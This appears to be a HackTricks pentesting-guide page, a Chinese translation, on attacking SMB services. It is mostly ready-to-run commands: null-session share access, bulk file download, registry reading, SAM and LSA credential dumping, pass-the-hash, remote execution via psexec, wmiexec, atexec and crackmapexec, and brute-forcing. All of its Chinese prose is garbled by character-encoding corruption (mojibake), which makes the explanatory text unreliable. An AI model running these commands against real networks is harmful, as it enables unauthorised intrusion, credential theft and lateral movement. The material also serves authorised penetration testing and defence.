<p>æ‚¨å¯ä»¥å°è¯•ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿æ¥åˆ°å®ƒä»¬</p>
<pre><code class="language-bash">smbclient -U '%' -N \\\\&lt;IP&gt;\\&lt;SHARE&gt; # null session to connect to a windows share
smbclient -U '&lt;USER&gt;' \\\\&lt;IP&gt;\\&lt;SHARE&gt; # authenticated session to connect to a windows share (you will be prompted for a password)
</code></pre>
<p>æˆ–æ­¤è„šæœ¬ï¼ˆä½¿ç”¨ç©ºä¼šè¯ï¼‰</p>
<pre><code class="language-bash">#/bin/bash

ip='&lt;TARGET-IP-HERE&gt;'
shares=('C$' 'D$' 'ADMIN$' 'IPC$' 'PRINT$' 'FAX$' 'SYSVOL' 'NETLOGON')

for share in ${shares[*]}; do
output=$(smbclient -U '%' -N \\\\$ip\\$share -c '')

if [[ -z $output ]]; then
echo "[+] creating a null session is possible for $share" # no output if command goes through, thus assuming that a session was created
else
echo $output # echo error message (e.g. NT_STATUS_ACCESS_DENIED or NT_STATUS_BAD_NETWORK_NAME)
fi
done
</code></pre>
<p>ç¤ºä¾‹</p>
<pre><code class="language-bash">smbclient -U '%' -N \\\\192.168.0.24\\im_clearly_not_here # returns NT_STATUS_BAD_NETWORK_NAME
smbclient -U '%' -N \\\\192.168.0.24\\ADMIN$ # returns NT_STATUS_ACCESS_DENIED or even gives you a session
</code></pre>
<h3 id="ä»windowsæšä¸¾å…±äº«æ— éœ€ç¬¬ä¸‰æ–¹å·¥å…·"><a class="header" href="#ä»windowsæšä¸¾å…±äº«æ— éœ€ç¬¬ä¸‰æ–¹å·¥å…·"><strong>ä»Windowsæšä¸¾å…±äº«/æ— éœ€ç¬¬ä¸‰æ–¹å·¥å…·</strong></a></h3>
<p>PowerShell</p>
<pre><code class="language-powershell"># Retrieves the SMB shares on the locale computer.
Get-SmbShare
Get-WmiObject -Class Win32_Share
# Retrieves the SMB shares on a remote computer.
get-smbshare -CimSession "&lt;computer name or session object&gt;"
# Retrieves the connections established from the local SMB client to the SMB servers.
Get-SmbConnection
</code></pre>
<p>CMD æ§åˆ¶å°</p>
<pre><code class="language-shell"># List shares on the local computer
net share
# List shares on a remote computer (including hidden ones)
net view \\&lt;ip&gt; /all
</code></pre>
<p>MMC å¿«æ·æ–¹å¼ï¼ˆå›¾å½¢ï¼‰</p>
<pre><code class="language-shell"># Shared Folders: Shared Folders &gt; Shares
fsmgmt.msc
# Computer Management: Computer Management &gt; System Tools &gt; Shared Folders &gt; Shares
compmgmt.msc
</code></pre>
<p>explorer.exe (å›¾å½¢ç•Œé¢)ï¼Œè¾“å…¥ <code>\\&lt;ip&gt;\</code> ä»¥æŸ¥çœ‹å¯ç”¨çš„ééšè—å…±äº«ã€‚</p>
<h3 id="æŒ‚è½½å…±äº«æ–‡ä»¶å¤¹"><a class="header" href="#æŒ‚è½½å…±äº«æ–‡ä»¶å¤¹">æŒ‚è½½å…±äº«æ–‡ä»¶å¤¹</a></h3>
<pre><code class="language-bash">mount -t cifs //x.x.x.x/share /mnt/share
mount -t cifs -o "username=user,password=password" //x.x.x.x/share /mnt/share
</code></pre>
<h3 id="ä¸‹è½½æ–‡ä»¶"><a class="header" href="#ä¸‹è½½æ–‡ä»¶"><strong>ä¸‹è½½æ–‡ä»¶</strong></a></h3>
<p>é˜…è¯»å‰é¢çš„éƒ¨åˆ†ä»¥äº†è§£å¦‚ä½•ä½¿ç”¨å‡­æ®/Pass-the-Hash è¿›è¡Œè¿æ¥ã€‚</p>
<pre><code class="language-bash">#Search a file and download
sudo smbmap -R Folder -H &lt;IP&gt; -A &lt;FileName&gt; -q # Search the file in recursive mode and download it inside /usr/share/smbmap
</code></pre>
<pre><code class="language-bash">#Download all
smbclient //&lt;IP&gt;/&lt;share&gt;
&gt; mask ""
&gt; recurse
&gt; prompt
&gt; mget *
#Download everything to current directory
</code></pre>
<p>Commands:</p>
<ul>
<li>mask: æŒ‡å®šç”¨äºè¿‡æ»¤ç›®å½•ä¸­æ–‡ä»¶çš„æ©ç ï¼ˆä¾‹å¦‚ï¼Œ""è¡¨ç¤ºæ‰€æœ‰æ–‡ä»¶ï¼‰</li>
<li>recurse: åˆ‡æ¢é€’å½’å¼€å…³ï¼ˆé»˜è®¤ï¼šå…³é—­ï¼‰</li>
<li>prompt: åˆ‡æ¢æ–‡ä»¶åæç¤ºå¼€å…³ï¼ˆé»˜è®¤ï¼šå¼€å¯ï¼‰</li>
<li>mget: å°†ä¸æ©ç åŒ¹é…çš„æ‰€æœ‰æ–‡ä»¶ä»ä¸»æœºå¤åˆ¶åˆ°å®¢æˆ·ç«¯æœºå™¨</li>
</ul>
<p>(<em>æ¥è‡ªsmbclientçš„æ‰‹å†Œä¿¡æ¯</em>)</p>
<h3 id="domain-shared-folders-search"><a class="header" href="#domain-shared-folders-search">Domain Shared Folders Search</a></h3>
<ul>
<li><a href="https://github.com/SnaffCon/Snaffler"><strong>Snaffler</strong></a>****</li>
</ul>
<pre><code class="language-bash">Snaffler.exe -s -d domain.local -o snaffler.log -v data
</code></pre>
<ul>
<li><a href="https://wiki.porchetta.industries/smb-protocol/spidering-shares"><strong>CrackMapExec</strong></a> çˆ¬è™«ã€‚</li>
<li><code>-M spider_plus [--share &lt;share_name&gt;]</code></li>
<li><code>--pattern txt</code></li>
</ul>
<pre><code class="language-bash">sudo crackmapexec smb 10.10.10.10 -u username -p pass -M spider_plus --share 'Department Shares'
</code></pre>
<p>ç‰¹åˆ«æœ‰è¶£çš„å…±äº«æ–‡ä»¶æ˜¯åä¸º <strong><code>Registry.xml</code></strong> çš„æ–‡ä»¶ï¼Œå› ä¸ºå®ƒä»¬ <strong>å¯èƒ½åŒ…å«</strong> é…ç½®ä¸ºé€šè¿‡ç»„ç­–ç•¥ <strong>è‡ªåŠ¨ç™»å½•</strong> çš„ç”¨æˆ·çš„å¯†ç ã€‚æˆ–è€… <strong><code>web.config</code></strong> æ–‡ä»¶ï¼Œå› ä¸ºå®ƒä»¬åŒ…å«å‡­æ®ã€‚</p>
<p>{% hint style="info" %}
<strong>SYSVOL å…±äº«</strong> å¯¹åŸŸä¸­çš„æ‰€æœ‰ç»è¿‡èº«ä»½éªŒè¯çš„ç”¨æˆ· <strong>å¯è¯»</strong>ã€‚åœ¨è¿™é‡Œï¼Œæ‚¨å¯èƒ½ä¼š <strong>æ‰¾åˆ°</strong> è®¸å¤šä¸åŒçš„æ‰¹å¤„ç†ã€VBScript å’Œ PowerShell <strong>è„šæœ¬</strong>ã€‚<br />
æ‚¨åº”è¯¥ <strong>æ£€æŸ¥</strong> å…¶ä¸­çš„ <strong>è„šæœ¬</strong>ï¼Œå› ä¸ºæ‚¨å¯èƒ½ä¼š <strong>å‘ç°</strong> æ•æ„Ÿä¿¡æ¯ï¼Œä¾‹å¦‚ <strong>å¯†ç </strong>ã€‚
{% endhint %}</p>
<h2 id="è¯»å–æ³¨å†Œè¡¨"><a class="header" href="#è¯»å–æ³¨å†Œè¡¨">è¯»å–æ³¨å†Œè¡¨</a></h2>
<p>æ‚¨å¯èƒ½èƒ½å¤Ÿä½¿ç”¨ä¸€äº›å‘ç°çš„å‡­æ® <strong>è¯»å–æ³¨å†Œè¡¨</strong>ã€‚Impacket <strong><code>reg.py</code></strong> å…è®¸æ‚¨å°è¯•ï¼š</p>
<pre><code class="language-bash">sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKCU -s
sudo reg.py domain.local/USERNAME@MACHINE.htb -hashes 1a3487d42adaa12332bdb34a876cb7e6:1a3487d42adaa12332bdb34a876cb7e6 query -keyName HKLM -s
</code></pre>
<h2 id="post-exploitation"><a class="header" href="#post-exploitation">Post Exploitation</a></h2>
<p><strong>Samba</strong> æœåŠ¡å™¨çš„ <strong>é»˜è®¤é…ç½®</strong> é€šå¸¸ä½äº <code>/etc/samba/smb.conf</code>ï¼Œå¯èƒ½åŒ…å«ä¸€äº› <strong>å±é™©é…ç½®</strong>ï¼š</p>
<div class="table-wrapper"><table><thead><tr><th><strong>è®¾ç½®</strong></th><th><strong>æè¿°</strong></th></tr></thead><tbody>
<tr><td><code>browseable = yes</code></td><td>å…è®¸åˆ—å‡ºå½“å‰å…±äº«ä¸­çš„å¯ç”¨å…±äº«ï¼Ÿ</td></tr>
<tr><td><code>read only = no</code></td><td>ç¦æ­¢åˆ›å»ºå’Œä¿®æ”¹æ–‡ä»¶ï¼Ÿ</td></tr>
<tr><td><code>writable = yes</code></td><td>å…è®¸ç”¨æˆ·åˆ›å»ºå’Œä¿®æ”¹æ–‡ä»¶ï¼Ÿ</td></tr>
<tr><td><code>guest ok = yes</code></td><td>å…è®¸åœ¨ä¸ä½¿ç”¨å¯†ç çš„æƒ…å†µä¸‹è¿æ¥åˆ°æœåŠ¡ï¼Ÿ</td></tr>
<tr><td><code>enable privileges = yes</code></td><td>å°Šé‡åˆ†é…ç»™ç‰¹å®š SID çš„æƒé™ï¼Ÿ</td></tr>
<tr><td><code>create mask = 0777</code></td><td>æ–°åˆ›å»ºçš„æ–‡ä»¶å¿…é¡»åˆ†é…ä»€ä¹ˆæƒé™ï¼Ÿ</td></tr>
<tr><td><code>directory mask = 0777</code></td><td>æ–°åˆ›å»ºçš„ç›®å½•å¿…é¡»åˆ†é…ä»€ä¹ˆæƒé™ï¼Ÿ</td></tr>
<tr><td><code>logon script = script.sh</code></td><td>ç”¨æˆ·ç™»å½•æ—¶éœ€è¦æ‰§è¡Œä»€ä¹ˆè„šæœ¬ï¼Ÿ</td></tr>
<tr><td><code>magic script = script.sh</code></td><td>å½“è„šæœ¬å…³é—­æ—¶åº”è¯¥æ‰§è¡Œå“ªä¸ªè„šæœ¬ï¼Ÿ</td></tr>
<tr><td><code>magic output = script.out</code></td><td>é­”æ³•è„šæœ¬çš„è¾“å‡ºéœ€è¦å­˜å‚¨åœ¨å“ªé‡Œï¼Ÿ</td></tr>
</tbody></table>
</div>
<p>å‘½ä»¤ <code>smbstatus</code> æä¾›æœ‰å…³ <strong>æœåŠ¡å™¨</strong> å’Œ <strong>è°å·²è¿æ¥</strong> çš„ä¿¡æ¯ã€‚</p>
<h2 id="authenticate-using-kerberos"><a class="header" href="#authenticate-using-kerberos">Authenticate using Kerberos</a></h2>
<p>æ‚¨å¯ä»¥ä½¿ç”¨å·¥å…· <strong>smbclient</strong> å’Œ <strong>rpcclient</strong> è¿›è¡Œ <strong>kerberos</strong> è®¤è¯ï¼š</p>
<pre><code class="language-bash">smbclient --kerberos //ws01win10.domain.com/C$
rpcclient -k ws01win10.domain.com
</code></pre>
<h2 id="æ‰§è¡Œå‘½ä»¤"><a class="header" href="#æ‰§è¡Œå‘½ä»¤"><strong>æ‰§è¡Œå‘½ä»¤</strong></a></h2>
<h3 id="crackmapexec"><a class="header" href="#crackmapexec"><strong>crackmapexec</strong></a></h3>
<p>crackmapexec å¯ä»¥é€šè¿‡ <strong>mmcexec, smbexec, atexec, wmiexec</strong> ä¸­çš„ä»»ä½•ä¸€ç§æ–¹æ³• <strong>æ‰§è¡Œå‘½ä»¤</strong>ï¼Œå…¶ä¸­ <strong>wmiexec</strong> æ˜¯ <strong>é»˜è®¤</strong> æ–¹æ³•ã€‚æ‚¨å¯ä»¥ä½¿ç”¨å‚æ•° <code>--exec-method</code> æŒ‡å®šæ‚¨å¸Œæœ›ä½¿ç”¨çš„é€‰é¡¹ï¼š</p>
<pre><code class="language-bash">apt-get install crackmapexec

crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -X '$PSVersionTable' #Execute Powershell
crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami #Excute cmd
crackmapexec smb 192.168.10.11 -u Administrator -H &lt;NTHASH&gt; -x whoami #Pass-the-Hash
# Using --exec-method {mmcexec,smbexec,atexec,wmiexec}

crackmapexec smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u Administrator -p 'password' --sam #Dump SAM
crackmapexec smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u Administrator -p 'password' --lsa #Dump LSASS in memmory hashes
crackmapexec smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u Administrator -p 'password' --sessions #Get sessions (
crackmapexec smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u Administrator -p 'password' --loggedon-users #Get logged-on users
crackmapexec smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u Administrator -p 'password' --disks #Enumerate the disks
crackmapexec smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u Administrator -p 'password' --users #Enumerate users
crackmapexec smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u Administrator -p 'password' --groups # Enumerate groups
crackmapexec smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u Administrator -p 'password' --local-groups # Enumerate local groups
crackmapexec smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u Administrator -p 'password' --pass-pol #Get password policy
crackmapexec smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u Administrator -p 'password' --rid-brute #RID brute

crackmapexec smb &lt;IP&gt; -d &lt;DOMAIN&gt; -u Administrator -H &lt;HASH&gt; #Pass-The-Hash
</code></pre>
<h3 id="psexecsmbexec"><a class="header" href="#psexecsmbexec"><a href="../../windows-hardening/lateral-movement/psexec-and-winexec.html"><strong>psexec</strong></a><strong>/</strong><a href="../../windows-hardening/lateral-movement/smbexec.html"><strong>smbexec</strong></a></a></h3>
<p>è¿™ä¸¤ä¸ªé€‰é¡¹å°†<strong>åœ¨å—å®³è€…æœºå™¨ä¸Šåˆ›å»ºä¸€ä¸ªæ–°æœåŠ¡</strong>ï¼ˆé€šè¿‡ SMB ä½¿ç”¨ <em>\pipe\svcctl</em>ï¼‰ï¼Œå¹¶åˆ©ç”¨å®ƒæ¥<strong>æ‰§è¡ŒæŸäº›æ“ä½œ</strong>ï¼ˆ<strong>psexec</strong> å°†<strong>ä¸Šä¼ </strong>ä¸€ä¸ªå¯æ‰§è¡Œæ–‡ä»¶åˆ° ADMIN$ å…±äº«ï¼Œè€Œ <strong>smbexec</strong> å°†æŒ‡å‘ <strong>cmd.exe/powershell.exe</strong> å¹¶å°†æœ‰æ•ˆè½½è·ä½œä¸ºå‚æ•°æ”¾å…¥ --<strong>æ— æ–‡ä»¶æŠ€æœ¯-</strong>-ï¼‰ã€‚<br />
æœ‰å…³ <a href="../../windows-hardening/lateral-movement/psexec-and-winexec.html"><strong>psexec</strong></a> å’Œ <a href="../../windows-hardening/lateral-movement/smbexec.html"><strong>smbexec</strong></a> çš„<strong>æ›´å¤šä¿¡æ¯</strong>ã€‚<br />
åœ¨ <strong>kali</strong> ä¸­ï¼Œå®ƒä½äº /usr/share/doc/python3-impacket/examples/</p>
<pre><code class="language-bash">#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]&lt;targetName or address&gt;
./psexec.py -hashes &lt;LM:NT&gt; administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p q23q34t34twd3w34t34wtw34t # Use pass the hash
</code></pre>
<p>ä½¿ç”¨ <strong>å‚æ•°</strong><code>-k</code>ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ <strong>kerberos</strong> è¿›è¡Œèº«ä»½éªŒè¯ï¼Œè€Œä¸æ˜¯ <strong>NTLM</strong>ã€‚</p>
<h3 id="wmiexecdcomexec"><a class="header" href="#wmiexecdcomexec"><a href="../../windows-hardening/lateral-movement/wmiexec.html">wmiexec</a>/dcomexec</a></h3>
<p>é€šè¿‡ <strong>ç«¯å£ 135</strong> éšç§˜åœ°æ‰§è¡Œå‘½ä»¤ shellï¼Œè€Œä¸æ¥è§¦ç£ç›˜æˆ–è¿è¡Œæ–°æœåŠ¡ï¼Œä½¿ç”¨ DCOMã€‚<br />
åœ¨ <strong>kali</strong> ä¸­ï¼Œå®ƒä½äº /usr/share/doc/python3-impacket/examples/</p>
<pre><code class="language-bash">#If no password is provided, it will be prompted
./wmiexec.py [[domain/]username[:password]@]&lt;targetName or address&gt; #Prompt for password
./wmiexec.py -hashes LM:NT administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
</code></pre>
<p>ä½¿ç”¨ <strong>parameter</strong><code>-k</code> ä½ å¯ä»¥ä½¿ç”¨ <strong>kerberos</strong> è¿›è¡Œèº«ä»½éªŒè¯ï¼Œè€Œä¸æ˜¯ <strong>NTLM</strong></p>
<pre><code class="language-bash">#If no password is provided, it will be prompted
./dcomexec.py [[domain/]username[:password]@]&lt;targetName or address&gt;
./dcomexec.py -hashes &lt;LM:NT&gt; administrator@10.10.10.103 #Pass-the-Hash
#You can append to the end of the command a CMD command to be executed, if you dont do that a semi-interactive shell will be prompted
</code></pre>
<h3 id="atexec"><a class="header" href="#atexec"><a href="../../windows-hardening/lateral-movement/atexec.html">AtExec</a></a></h3>
<p>é€šè¿‡ä»»åŠ¡è°ƒåº¦ç¨‹åºæ‰§è¡Œå‘½ä»¤ï¼ˆä½¿ç”¨ <em>\pipe\atsvc</em> é€šè¿‡ SMBï¼‰ã€‚<br />
åœ¨ <strong>kali</strong> ä¸­ä½äº /usr/share/doc/python3-impacket/examples/</p>
<pre><code class="language-bash">./atexec.py [[domain/]username[:password]@]&lt;targetName or address&gt; "command"
./atexec.py -hashes &lt;LM:NT&gt; administrator@10.10.10.175 "whoami"
</code></pre>
<h2 id="impacket-å‚è€ƒ"><a class="header" href="#impacket-å‚è€ƒ">Impacket å‚è€ƒ</a></h2>
<p><a href="https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/">https://www.hackingarticles.in/beginners-guide-to-impacket-tool-kit-part-1/</a></p>
<h2 id="æš´åŠ›ç ´è§£ç”¨æˆ·å‡­è¯"><a class="header" href="#æš´åŠ›ç ´è§£ç”¨æˆ·å‡­è¯"><strong>æš´åŠ›ç ´è§£ç”¨æˆ·å‡­è¯</strong></a></h2>
<p><strong>è¿™ä¸æ¨èï¼Œå¦‚æœè¶…è¿‡å…è®¸çš„æœ€å¤§å°è¯•æ¬¡æ•°ï¼Œæ‚¨å¯èƒ½ä¼šé”å®šè´¦æˆ·</strong></p>
<pre><code class="language-bash">nmap --script smb-brute -p 445 &lt;IP&gt;
ridenum.py &lt;IP&gt; 500 50000 /root/passwds.txt #Get usernames bruteforcing that rids and then try to bruteforce each user name
</code></pre>
<h2 id="smb-ç»§ç”µå™¨æ”»å‡»"><a class="header" href="#smb-ç»§ç”µå™¨æ”»å‡»">SMB ç»§ç”µå™¨æ”»å‡»</a></h2>
<p>æ­¤æ”»å‡»ä½¿ç”¨ Responder å·¥å…·åŒ…æ¥ <strong>æ•è·å†…éƒ¨ç½‘ç»œä¸Šçš„ SMB è®¤è¯ä¼šè¯</strong>ï¼Œå¹¶å°†å…¶ <strong>ä¸­ç»§</strong> åˆ° <strong>ç›®æ ‡æœºå™¨</strong>ã€‚å¦‚æœè®¤è¯ <strong>ä¼šè¯æˆåŠŸ</strong>ï¼Œå®ƒå°†è‡ªåŠ¨å°†æ‚¨å¸¦å…¥ <strong>ç³»ç»Ÿ</strong> <strong>shell</strong>ã€‚<br />
<a href="../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.html"><strong>æœ‰å…³æ­¤æ”»å‡»çš„æ›´å¤šä¿¡æ¯è¯·ç‚¹å‡»è¿™é‡Œã€‚</strong></a></p>
<h2 id="smb-trap"><a class="header" href="#smb-trap">SMB-Trap</a></h2>
<p>å½“é¡µé¢å°è¯•é€šè¿‡ SMB è®¿é—®æŸäº›å†…å®¹æ—¶ï¼ŒWindows åº“ URLMon.dll ä¼šè‡ªåŠ¨å°è¯•å¯¹ä¸»æœºè¿›è¡Œèº«ä»½éªŒè¯ï¼Œä¾‹å¦‚ï¼š<code>img src="\\10.10.10.10\path\image.jpg"</code></p>
<p>è¿™å‘ç”Ÿåœ¨ä»¥ä¸‹å‡½æ•°ä¸­ï¼š</p>
<ul>
<li>URLDownloadToFile</li>
<li>URLDownloadToCache</li>
<li>URLOpenStream</li>
<li>URLOpenBlockingStream</li>
</ul>
<p>è¿™äº›å‡½æ•°è¢«ä¸€äº›æµè§ˆå™¨å’Œå·¥å…·ï¼ˆå¦‚ Skypeï¼‰ä½¿ç”¨ã€‚</p>
<p><img src="../../.gitbook/assets/image%20(358).png" alt="æ¥æº: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html" /></p>
<h3 id="ä½¿ç”¨-mitmf-çš„-smbtrap"><a class="header" href="#ä½¿ç”¨-mitmf-çš„-smbtrap">ä½¿ç”¨ MitMf çš„ SMBTrap</a></h3>
<p><img src="../../.gitbook/assets/image%20(892).png" alt="æ¥æº: http://www.elladodelmal.com/2017/02/como-hacer-ataques-smbtrap-windows-con.html" /></p>
<h2 id="ntlm-ç›—çªƒ"><a class="header" href="#ntlm-ç›—çªƒ">NTLM ç›—çªƒ</a></h2>
<p>ä¸ SMB æ•è·ç±»ä¼¼ï¼Œå°†æ¶æ„æ–‡ä»¶æ¤å…¥ç›®æ ‡ç³»ç»Ÿï¼ˆä¾‹å¦‚é€šè¿‡ SMBï¼‰å¯ä»¥å¼•å‘ SMB è®¤è¯å°è¯•ï¼Œä»è€Œå…è®¸ä½¿ç”¨ Responder ç­‰å·¥å…·æ‹¦æˆª NetNTLMv2 å“ˆå¸Œã€‚ç„¶åå¯ä»¥ç¦»çº¿ç ´è§£è¯¥å“ˆå¸Œæˆ–åœ¨ <a href="./#smb-relay-attack">SMB ç»§ç”µå™¨æ”»å‡»</a> ä¸­ä½¿ç”¨ã€‚</p>
<p><a href="../../windows-hardening/ntlm/places-to-steal-ntlm-creds.html#ntlm_theft">æŸ¥çœ‹: ntlm_theft</a></p>
<h2 id="hacktricks-è‡ªåŠ¨å‘½ä»¤"><a class="header" href="#hacktricks-è‡ªåŠ¨å‘½ä»¤">HackTricks è‡ªåŠ¨å‘½ä»¤</a></h2>
<pre><code>Protocol_Name: SMB    #Protocol Abbreviation if there is one.
Port_Number:  137,138,139     #Comma separated if there is more than one.
Protocol_Description: Server Message Block         #Protocol Abbreviation Spelled out

Entry_1:
Name: Notes
Description: Notes for SMB
Note: |
While Port 139 is known technically as â€˜NBT over IPâ€™, Port 445 is â€˜SMB over IPâ€™. SMB stands for â€˜Server Message Blocksâ€™. Server Message Block in modern language is also known as Common Internet File System. The system operates as an application-layer network protocol primarily used for offering shared access to files, printers, serial ports, and other sorts of communications between nodes on a network.

#These are the commands I run in order every time I see an open SMB port

With No Creds
nbtscan {IP}
smbmap -H {IP}
smbmap -H {IP} -u null -p null
smbmap -H {IP} -u guest
smbclient -N -L //{IP}
smbclient -N //{IP}/ --option="client min protocol"=LANMAN1
rpcclient {IP}
rpcclient -U "" {IP}
crackmapexec smb {IP}
crackmapexec smb {IP} --pass-pol -u "" -p ""
crackmapexec smb {IP} --pass-pol -u "guest" -p ""
GetADUsers.py -dc-ip {IP} "{Domain_Name}/" -all
GetNPUsers.py -dc-ip {IP} -request "{Domain_Name}/" -format hashcat
GetUserSPNs.py -dc-ip {IP} -request "{Domain_Name}/"
getArch.py -target {IP}

With Creds
smbmap -H {IP} -u {Username} -p {Password}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP}
smbclient "\\\\{IP}\\\" -U {Username} -W {Domain_Name} -l {IP} --pw-nt-hash `hash`
crackmapexec smb {IP} -u {Username} -p {Password} --shares
GetADUsers.py {Domain_Name}/{Username}:{Password} -all
GetNPUsers.py {Domain_Name}/{Username}:{Password} -request -format hashcat
GetUserSPNs.py {Domain_Name}/{Username}:{Password} -request

https://book.hacktricks.xyz/pentesting/pentesting-smb

Entry_2:
Name: Enum4Linux
Description: General SMB Scan
Command: enum4linux -a {IP}

Entry_3:
Name: Nmap SMB Scan 1
Description: SMB Vuln Scan With Nmap
Command: nmap -p 139,445 -vv -Pn --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse {IP}

Entry_4:
Name: Nmap Smb Scan 2
Description: SMB Vuln Scan With Nmap (Less Specific)
Command: nmap --script 'smb-vuln*' -Pn -p 139,445 {IP}

Entry_5:
Name: Hydra Brute Force
Description: Need User
Command: hydra -t 1 -V -f -l {Username} -P {Big_Passwordlist} {IP} smb

Entry_6:
Name: SMB/SMB2 139/445 consolesless mfs enumeration
Description: SMB/SMB2 139/445  enumeration without the need to run msfconsole
Note: sourced from https://github.com/carlospolop/legion
Command: msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 139; run; exit' &amp;&amp; msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 139; run; exit' &amp;&amp; msfconsole -q -x 'use auxiliary/scanner/smb/smb_version; set RHOSTS {IP}; set RPORT 445; run; exit' &amp;&amp; msfconsole -q -x 'use auxiliary/scanner/smb/smb2; set RHOSTS {IP}; set RPORT 445; run; exit'

</code></pre>
<p>{% hint style="success" %}
å­¦ä¹ ä¸å®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)</strong></a><img src="../../.gitbook/assets/arte.png" alt="" data-size="line"><br />
å­¦ä¹ ä¸å®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="../../.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)</strong><img src="../../.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
<details>
<summary>æ”¯æŒ HackTricks</summary>
<ul>
<li>æŸ¥çœ‹ <a href="https://github.com/sponsors/carlospolop"><strong>è®¢é˜…è®¡åˆ’</strong></a>!</li>
<li><strong>åŠ å…¥</strong> ğŸ’¬ <a href="https://discord.gg/hRep4RUj7f"><strong>Discord ç¾¤ç»„</strong></a> æˆ– <a href="https://t.me/peass"><strong>Telegram ç¾¤ç»„</strong></a> æˆ– <strong>å…³æ³¨</strong> æˆ‘ä»¬çš„ <strong>Twitter</strong> ğŸ¦ <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
<li><strong>é€šè¿‡å‘</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> å’Œ <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚</li>
</ul>
</details>
{% endhint %}

                    </main>

                    <nav class="nav-wrapper" aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="../../network-services-pentesting/137-138-139-pentesting-netbios.html" class="mobile-nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i class="fa fa-angle-left"></i>
                            </a>

                            <a rel="next prefetch" href="../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.html" class="mobile-nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i class="fa fa-angle-right"></i>
                            </a>

                        <div style="clear: both"></div>
                    </nav>
                </div>
            </div>

            <nav class="nav-wide-wrapper" aria-label="Page navigation">
                    <a rel="prev" href="../../network-services-pentesting/137-138-139-pentesting-netbios.html" class="nav-chapters previous" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i class="fa fa-angle-left"></i>
                    </a>

                    <a rel="next prefetch" href="../../network-services-pentesting/pentesting-smb/rpcclient-enumeration.html" class="nav-chapters next" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i class="fa fa-angle-right"></i>
                    </a>
            </nav>

        </div>




        <script>
            window.playground_copyable = true;
        </script>


        <script src="../../elasticlunr.min.js"></script>
        <script src="../../mark.min.js"></script>
        <script src="../../searcher.js"></script>

        <script src="../../clipboard.min.js"></script>
        <script src="../../highlight.js"></script>
        <script src="../../book.js"></script>

        <!-- Custom JS scripts -->


    </div>
    </body>
</html>
